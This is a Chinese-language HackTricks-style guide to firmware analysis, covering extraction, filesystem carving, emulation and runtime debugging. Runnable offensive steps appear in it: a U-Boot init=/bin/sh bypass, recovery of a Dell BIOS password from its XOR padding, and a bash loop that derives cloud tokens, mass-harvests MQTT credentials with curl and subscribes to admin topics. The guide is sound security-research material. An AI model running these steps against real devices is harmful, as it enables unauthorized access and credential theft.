# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

有关通过暴露的硬件接口获取固件，请参阅 [借助 UART 控制台转储固件](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) 和 [转储 SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)。有关在访问控制台之前，于启动时重复捕获 UART 数据，请参阅 [通过 SCPI 控制电源和示波器进行采集](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi)。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是使设备能够正常运行的关键软件，负责管理并促进硬件组件与用户交互软件之间的通信。它存储在永久性存储器中，确保设备从通电之时起即可访问重要指令，从而启动操作系统。检查并可能修改固件，是识别安全漏洞的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **信息收集**

**信息收集**是了解设备构成及其所用技术的重要初始步骤。此过程包括收集以下信息：

- CPU 架构及其运行的操作系统
- Bootloader 相关信息
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库及其许可证类型
- 更新历史和监管认证
- 架构图和流程图
- 安全评估及已发现的漏洞

为此，**开源情报 (OSINT)** 工具非常有用；同时，也可以通过人工和自动化审查流程分析任何可用的开源软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于发现潜在问题。

## **获取固件**

获取固件有多种途径，复杂程度各不相同：

- 从源头（开发者、制造商）**直接获取**
- 根据提供的说明**自行构建**
- 从官方支持网站**下载**
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问**云存储**，可使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 使用中间人技术拦截**更新**
- 通过 **UART**、[**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) 或 **PICit** 等连接从设备中**提取**
- 在设备通信过程中**嗅探**更新请求
- 识别并使用**硬编码的更新端点**
- 从 Bootloader 或网络**转储**
- 如果其他方法都失败，则使用适当的硬件工具**拆下并读取**存储芯片

### 仅有 UART 日志：通过 flash 中的 U-Boot 环境变量强制启动 root shell

如果 UART RX 被忽略（只有日志），仍可以通过离线**编辑 U-Boot 环境变量数据块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹子和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 定位 U-Boot env 分区，编辑 `bootargs`，加入 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应该会出现 shell。

这在 bootloader shell 已禁用、但可通过外部 Flash 访问写入 env 分区的嵌入式设备上很有用。

### 通过 Firewall copy task 泄露受保护代码

某些 MCU 允许未受保护的应用程序代码调用受保护区域的 gateway，而不是直接读取受保护的 Flash。获得应用程序代码执行能力后，应将每个 gateway task 作为独立的内存传输原语进行检查。在 Cypherock X1 案例中，STM32L4 Firewall call gate 接受一个 task、一个外部 `data` 指针、一个长度以及一个受保护的 `address`。某个写入 task 未能拒绝指向 Firewall Code 的 `data` 源指针。调用方无法直接读取该代码，但 gateway 本身可以将其复制到受保护的非易失性存储中，再通过允许的读取 task 将其读出。<sup>[[15]](#references)</sup>

要复现这类泄露，先找出一个可写的受保护存储页，并确认有对应的读取 task；然后将写入源设置为依次递增的受保护代码地址，再读回暂存的字节。重复写入前，检查存储介质：本案例使用的是 Flash，因此复用页面前必须先擦除。研究人员使用了一个例程来擦除并还原有效的 Secure Data Storage 内容，然后将代码暂存到剩余的空闲空间，而非覆盖钱包数据。这需要在 MCU 上执行代码，并且能够访问 call gate；它并非通过未认证主机直接绕过读取限制。<sup>[[15]](#references)</sup>

恢复出的代码可能会暴露[固件更新与启动完整性方面的信任缺口](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata)。<sup>[[15]](#references)</sup>

## 分析固件

现在你已经**获得固件**，需要提取相关信息，以了解如何处理它。可用的工具有：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果用这些工具没找到太多内容，可以用 `binwalk -E <bin>` 检查镜像的**熵**。如果熵较低，则它不太可能经过加密；如果熵较高，则很可能经过加密（或以某种方式压缩）。

此外，你可以使用这些工具提取**固件中嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 检查文件。

### 外部 flash 中的原始显示资源

外部 SPI 转储不一定是 MCU 的可执行固件。对于 Cortex-M 目标，应将每个候选代码区域的起始位置与设备内存映射进行比较：正常的向量表应以合理的 SRAM 堆栈指针和位于可执行内存中的复位处理程序地址开头。仅仅在偏移量 0 处找不到向量表，并不能证明整个芯片都没有代码；还应检查其他偏移量和启动布局。如果 `binwalk` 没有找到容器，请检查原始字节，并将[解码后的 SPI 捕获](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer)中的 flash 读取地址与加载新屏幕的操作关联起来。<sup>[[14]](#references)</sup>

对于显示资源区域，应尝试不同的候选像素格式和尺寸，而不要假定是 PNG/JPEG。文中引用的设备使用 **80×160 RGB565 little-endian** 帧：每像素两字节，因此每帧大小为 **25,600 字节**（25 KiB），而不是 24 千比特。解码出的 flash 读取地址确定了屏幕资源的偏移量；研究人员使用 `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` 转换准备好的图像，将原始转储中大小相同的资源替换掉，使用 `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` 写入，并确认显示屏显示了新图像。这证明了**外部显示资源**可写入，并不代表提取或重刷了 MCU 的内部固件。执行任何写入前，请保留原始转储，并核实尺寸、字节序、偏移量和替换数据长度。<sup>[[14]](#references)</sup>

### 差分 flash 分析和可恢复的 XOR 密钥存储

如果固件设置没有文档说明其存储格式，应先读取几次匹配的 flash 数据，**只更改一个**设置，再次转储整个芯片并比较各个偏移量。使用受控值重复实验，可以将该设置与计数器和写入元数据区分开来；如果变化出现在新的偏移量而非原位，则表明存储采用追加式或日志结构。保留已删除/标记为 tombstone 的条目，因为其负载字节可能仍可恢复。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

定位该区域后，使用 `binwalk` 等工具提取固件模块，并在 Ghidra 中逆向分析写入器和验证器。应在代码中确认字段边界、填充、密钥索引和密钥派生方式，而不是仅根据密文模式推断加密方案。<sup>[[12]](#references)</sup>

#### 从加密的零填充中恢复密钥

如 [基于 XOR 的加密](../../crypto/symmetric/#xor-based-encryption) 中所述，已知明文可以揭示相同偏移处的密钥流字节。当固定长度字段的零填充覆盖了循环 XOR 密钥的所有索引时，该字段尤其容易受到攻击：加密后的填充会直接揭示这些密钥字节，因为 `0x00 XOR key_byte = key_byte`。如果覆盖了所有密钥索引，就可以从密文尾部重建密钥，并解密已填充的字节。<sup>[[12]](#references)</sup>

Dell 易受攻击的 DVAR BIOS 密码格式就是一个具体示例：32 字节字段中的字节 `0` 是明文，而字节 `1..31` 使用循环重复的 20 字节密钥。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

对于密码长度 `L`，在 XOR 前，位置 `L..31` 的值均为零。当 `L <= 12` 时，这些位置覆盖所有密钥索引，因此无需 brute force 即可恢复完整密钥和密码：<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 从历史记录中提取密钥

不要单独分析每条记录。DVAR 密钥近似由 `modified_md5(device_seed || variable_GUID || password[0])` 派生：device seed 和 GUID 是固定的，唯一取决于密码的输入是明文的首字节。每台设备最多有 256 个密钥，因此首字节相同的记录会共用一个密钥。按该字节对有效记录和已删除记录分组；短历史记录可能通过填充泄露完整密钥，从而解密自身填充不足的当前较长记录。因此，如果密码轮换时旧密文只是被标记为删除而未被擦除，暴露风险可能会增加。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 工具可定位 DVAR、验证候选记录、恢复密码，并显示原始存储字节/密钥字节。从代码仓库构建该工具，并按以下方式扫描经过验证的闪存映像：<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

对于自定义解析器，应利用记录结构、可打印字符约束、零填充检查、密钥熵，以及密钥回绕处的一致性来排除误报。如果重复转储显示每次写入只有少量位发生翻转，应枚举观察到的掩码，并根据这些约束对修正结果进行排序；但如果字符存在歧义，应明确标出，而不要将启发式结果当作精确恢复结果。<sup>[[12]](#references)</sup>

密码验证器应存储加盐、经过迭代的一次性哈希，而不是可逆密文；采用日志结构的存储应安全删除已被取代的机密数据。<sup>[[12]](#references)</sup>

### 获取文件系统

使用前面介绍过的工具（如 `binwalk -ev <bin>`），你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，通常类型为以下之一：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的签名中**没有文件系统的 magic byte**。在这些情况下，使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩的文件系统**，然后按照文件系统类型，根据以下步骤**手动提取**文件系统。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

运行以下 **dd 命令**提取 Squashfs 文件系统。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（如上例所用）

`$ unsquashfs dir.squashfs`

之后，文件会位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 重建拆分的嵌入式根文件系统

如果原始 eMMC/SSD 转储包含有效的文件系统头，但其元数据偏移超出了标称分区范围，不要立即将其判定为损坏。嵌入式启动代码可以通过 Device Mapper 将多个物理范围组合成实际的根设备，因此从单个 GPT 分区中提取数据只会得到第一个片段。<sup>[[9]](#references)</sup>

#### 检查完整介质镜像

首先确认采集已完成、镜像大小稳定，并且没有写入程序仍在占用该镜像。如果文件名中编码了起始/结束地址，请将该范围与实际字节数进行比较。以只读模式恢复 GPT，并仅挂载所需范围；**不要**在工作站上针对不可信的物理卷运行 `vgchange -ay`，因为这可能导致卷组冲突和意外写入。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

当原始 init 逻辑或 LVM 堆栈必须读取整个镜像时，优先使用一次性 VM。标准启动分区中的历史启动日志尤其有用：bootloader 可能记录了专有容器的偏移量、组件长度、槽位选择、对齐规则和签名验证信息。使用这些值提取嵌入的命令行、kernel 和 initramfs，然后使用 `file`、magic bytes 和 `binwalk` 分别验证每个输出；读取到容器末尾可能会意外地将 initrd、ACPI 对象或签名附加到 kernel 后面。<sup>[[9]](#references)</sup>

#### 恢复启动时的块映射

提取 kernel 的 initramfs，并逆向分析其 `/init` 和任何存储库。在 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) 中，跟踪 `/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64` 和分区路径的字符串引用；然后追踪选择活动 A/B 槽位并构建映射表的代码。可用的 radare2 起始命令包括 `r2 -A init`、`afl`、`pdf @ main` 和 `pdf @ fcn.xxxxx`。<sup>[[9]](#references)</sup>

linear target 会将虚拟设备的连续范围映射到一个或多个后端设备的范围。恢复出的双段映射表通常如下所示（所有位置和长度均以 512 字节扇区为单位）：<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

精确复现机器码中的算术运算，包括整数宽度、移位和单位换算。例如，以下表达式会先将字节大小向下取整到 4-KiB 边界，然后才转换为 512-byte 扇区；如果将其替换为 `p4_bytes // 512`，那么只要分区未按页对齐，选定的尾部位置就会偏移 `p4_bytes % 4096`。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

通过按表格顺序复制各个范围，并使用有界大小的数据块，重建一份扁平分析镜像，而不是将完整媒体转储加载到内存中。这样也能避免创建主机侧 mapper 设备。将 GPT 推导出的偏移量、反向扇区数和最终输出长度分别作为断言检查。<sup>[[9]](#references)</sup>

#### 区分数据损坏与固定的重建错误

对于 SquashFS，在运行 `unsquashfs` 之前，检查 `hsqs` magic，并解码超级块偏移 40 处的小端 64 位 `bytes_used` 字段。如果多个互不相关的结构提取失败，请在预期位置周围搜索较宽的范围，并要求找到有力的结构候选：可解压的元数据块、多个连续的有效目录项、合理的 inode 字段、与 inode 数量一致的根 inode，或有效的完整性元数据结构。仅匹配到一个 magic 并不足够。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

当相同的有符号增量能让多个独立结构变得有效时——例如目录元数据和 verity 记录——可能的原因是系统性的段起始位置错误，而不是缺失字节。回到反向运算，检查是否丢弃了余数、是否存在有符号数问题或溢出，以及是否进行了扇区/页对齐取整，然后再尝试恢复孤立数据或修补文件系统元数据。<sup>[[9]](#references)</sup>

最后，要区分不同的保护边界：TPM 密封的 LUKS 卷保护数据机密性，而签名的 dm-verity 映射保护根文件系统完整性。软件 TPM 无法恢复密封到原始物理 TPM 的密钥；通过省略 verity 验证的、仅供研究使用的 init 启动经过修改的 SquashFS，并不会伪造其签名，也不会破坏 dm-verity。<sup>[[9]](#references)</sup>

## 分析固件

获取固件后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程会使用各种工具分析固件并提取有价值的数据。

### 初步分析工具

如需了解更多固件分析工具和相关资料，请参阅[第三方工具和资源中的固件部分](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware)。

以下提供了一组用于初步检查二进制文件（以下称为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统的详细信息：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其**熵**。熵较低表示可能未加密，熵较高则表示可能经过加密或压缩。

要提取**嵌入文件**，建议使用 **file-data-carving-recovery-tools** 文档和用于检查文件的 **binvis.io** 等工具与资源。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取内容通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，如果 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型，就需要手动提取。具体做法是先使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令 carve 出文件系统：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同命令手动提取内容。

### 文件系统分析

提取文件系统后，便开始查找安全漏洞。重点关注不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见 IoT 设备 Web 服务器和二进制文件

以下工具有助于发现文件系统中的敏感信息和漏洞：

- 使用 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 搜索敏感信息
- 使用 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 进行全面的固件分析
- 使用 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep) 和 [**EMBA**](https://github.com/e-m-b-a/emba) 进行静态和动态分析

### 编译二进制文件的安全检查

必须仔细检查文件系统中发现的源代码和编译二进制文件是否存在漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 则可用于 Windows 二进制文件，帮助识别可能被利用的未受保护二进制文件。

## 通过派生的 URL token 获取 cloud 配置和 MQTT 凭据

许多 IoT hub 会从类似以下形式的 cloud 端点获取每台设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析过程中，你可能会发现 `<token>` 是在本地使用硬编码密钥从设备 ID 派生出来的，例如：

- token = MD5( deviceId || STATIC_KEY )，并表示为大写十六进制

这种设计意味着，任何知道 deviceId 和 STATIC_KEY 的人都可以重建该 URL 并获取 cloud 配置，通常还能发现明文 MQTT 凭据和主题前缀。

实用工作流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找打印 cloud config URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制文件加载到 Ghidra/radare2，并搜索配置路径（“/pf/”）或 MD5 用法。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集 cloud 配置和 MQTT 凭据

- 组合 URL 并使用 curl 拉取 JSON；用 jq 提取机密：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护 topic，并查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（大规模执行，需获得授权）

- 许多生态系统会嵌入厂商 OUI/产品/类型字节，后面跟着一个顺序递增的后缀。
- 你可以遍历候选 ID，以编程方式派生 tokens 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

备注
- 尝试大规模枚举前，务必先获得明确授权。
- 尽可能优先使用仿真或静态分析来获取机密，避免修改目标硬件。

仿真固件的过程可以对设备运行情况或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将根文件系统或特定二进制文件传输到架构和字节序匹配的设备（例如 Raspberry Pi）或预先构建的虚拟机中，可以进一步开展测试。

### 仿真单个二进制文件

检查单个程序时，识别其字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

并安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（大端序），使用 `qemu-mips`；对于小端序二进制文件，则应使用 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，流程类似，使用 `qemu-arm` emulator 进行仿真。

### 完整系统仿真

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可实现完整固件仿真、自动化处理流程，并辅助动态分析。

### 重建用于仿真的拆分式和经过验证的根文件系统

如果 SquashFS superblock 可读，但 inode、目录或 fragment table 的偏移不可能成立，不要立即修改 `unsquashfs`。应逆向分析早期启动二进制文件，并复现它创建的块设备图：嵌入式系统可能会提供一个名义上的根分区，但实际文件系统是通过 `dm-linear` 映射构建的，该映射会追加从另一个分区借用的扇区。仅检查 superblock 可能会成功，即使后续所有元数据块都已偏移。<sup>[[11]](#references)</sup>

精确保留固件中的运算方式。尤其要确认长度的单位是字节、512 字节扇区还是 4 KiB 页面；按原始顺序复现移位和截断操作；并考虑 A/B 布局中依赖 bank 的尾部区域。例如，`(partition_bytes >> 12) << 3` 会先截断到 4 KiB 边界，然后才换算为 512 字节扇区；若将其替换为 `partition_bytes // 512`，追加范围可能会偏移几 KB，并破坏所有下游 SquashFS 表。<sup>[[11]](#references)</sup>

一个实用的验证流程如下：<sup>[[11]](#references)</sup>

1. 从 verifier/init 二进制文件中还原每个 `dm-linear` 段的源设备、起始扇区和长度。
2. 拼接或映射这些范围，同时保持其对齐语义不变。
3. 如果提取仍然失败，只在预测边界附近的小范围内搜索，并要求连续出现多个有效的元数据结构，而不是仅凭一个看似合理的 superblock 就接受结果。
4. 使用未修改的 `unsquashfs` 检查重建后的镜像；成功遍历所有目录和 fragment，比 `unsquashfs -stat` 更能说明问题。

#### 由分析人员控制的 dm-verity 替换

当分析人员控制 QEMU kernel、initramfs 和虚拟磁盘时，可以用一个小型静态链接 init 替换厂商的验证 PID 1，从而启动修改后的根文件系统。这属于**实验室启动链替换**，并非攻破 dm-verity、其 RSA 签名、Secure Boot 或 TPM 密封密钥。<sup>[[11]](#references)</sup>

替换用的 init 应复现原始启动流程中的实际操作：挂载 `devtmpfs`，调用 `setsid()`，将 `/dev/console` 连接到文件描述符 0–2，挂载 `/proc` 和 `/sys`，等待提供的块设备就绪，以只读方式挂载编辑后的根文件系统，卸载旧根文件系统上的伪文件系统，将新挂载点移动到 `/`，执行 `chroot`，然后通过 `execve()` 启动固件原有的 `/sbin/init`。在 `MS_MOVE` **之前**卸载 `/dev`、`/proc` 和 `/sys`，可避免意外卸载属于新根文件系统的挂载点。<sup>[[11]](#references)</sup>

将可变设备状态与修改后的只读根文件系统分开保存。qcow2 overlay 可以保留原始磁盘的 LVM 状态，同时由第二块只读 virtio 磁盘提供编辑后的 SquashFS：<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 离线镜像状态调试

如果启动缓慢、破坏性启动脚本或不可靠的控制台日志掩盖了故障，请检查 guest 外部的持久状态。切勿挂载正在被运行中 VM 使用的 overlay；使用 `qemu-nbd` 将其暴露出来，将 LVM 发现范围限制在目标 NBD 分区，并在断开连接前停用卷组。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

为便于重复进行故障隔离，请将带时间戳的标记文件写入稳定的可写卷，并离线验证；`/dev/kmsg`、FIFO 和临时控制台可能因速率限制或进程过早退出而产生假阴性。在修改无关代码之前，也请先比较各层的具体接口：`uname -r` 与 `/lib/modules/`、磁盘上的 ext4 特性与内核配置，以及 Mesa `libGL` 的版本与 DRI driver ABI 和根据 PCI 信息确定的 driver 名称。某个组件可能存在，甚至能成功 `dlopen()`，但仍然无法使用，因为其使用方预期的是不同的 ABI。<sup>[[11]](#references)</sup>

## 实践中的动态分析

在此阶段，使用真实或仿真的设备环境进行分析。必须保持对 OS 和文件系统的 shell 访问。仿真可能无法完美模拟硬件交互，因此有时需要重启仿真。分析应重新检查文件系统，利用暴露的网页和网络服务，并探索 bootloader 漏洞。固件完整性测试对于识别潜在的 backdoor 漏洞至关重要。

## 运行时分析技术

运行时分析是指在进程或二进制文件所处的运行环境中与之交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 和其他技术识别漏洞。

对于没有完整 debugger 的嵌入式目标设备，可将**静态链接的 `gdbserver` 复制**到设备上，然后进行远程连接：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 消息映射

在 IoT hub 上，RF stack 通常由 **radio MCU** 和 Linux userland process 分担。一个实用的工作流程是映射以下路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text 或 TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个逆向分析目标，而不是一个。如果 controller 将二进制 radio frame 转换为 `Group,Command,arg1,arg2,...` 这样的文本协议，就要还原：

- **message group** 和 dispatch table
- 哪些消息可以来自 **network**，哪些只能来自 controller 本身
- 确切的 **manufacturer-specific discriminator field**（例如 Zigbee `manufacturer_code` 和自定义的 `cluster_command`）
- 哪些 handler 只有在 **commissioning**、discovery 或 firmware/model 下载阶段才能到达

对于 Zigbee，具体来说，捕获配对流量并检查目标是否仍依赖默认 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning 流量可能会泄露 **Network Key**。Zigbee 3.0 install code 可以减少这种风险，因此要注意受测设备是否确实强制要求使用它们。

### Manufacturer-specific protocol handler 和 FSM-gated reachability

Vendor-specific Zigbee/ZCL command 往往比标准化 cluster 更值得关注，因为它们会进入较少经过实战检验的 **custom parsing code** 和内部 **FSM**。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向分析 command dispatcher，直到找到 **vendor-only handler**。
- 还原 **FSM state**、**event**、**check**、**action** 和 **next-state** table。
- 找出会自动推进的 **transitional state**，以及最终会 reset 或释放攻击者可控状态的 retry/error 分支。
- 确认需要哪些合法的 protocol exchange 才能让 daemon 进入易受攻击的状态，不要想当然地认为总能到达存在 bug 的 handler。

对于对时序敏感的 protocol，使用 Python framework 重放 packet 可能太慢。更可靠的方法是在真实硬件（例如 **nRF52840**）上模拟合法设备，并使用 vendor-grade stack，以便提供正确的 **endpoint**、**attribute** 和 commissioning 时序。

### Embedded daemon 中的 fragmented-download bug 类型

**fragmented blob/model/configuration download** 中经常会出现以下 firmware bug 类型：<sup>[[8]](#references)</sup>

1. **第一个 fragment**（`offset == 0`）会存储 `ctx->total_size` 并分配 `malloc(total_size)`。
2. 后续 fragment 只会验证攻击者可控的 **packet-local** 字段，例如 `packet_total_size >= offset + chunk_len`。
3. 执行复制时使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却不检查是否超出 **最初分配的大小**。

攻击者可以：

- 发送一个声明总大小**较小**的有效首个 fragment，迫使程序分配较小的 heap 区块。
- 随后发送一个 **offset 符合预期**、但 `chunk_len` 更大的 fragment。
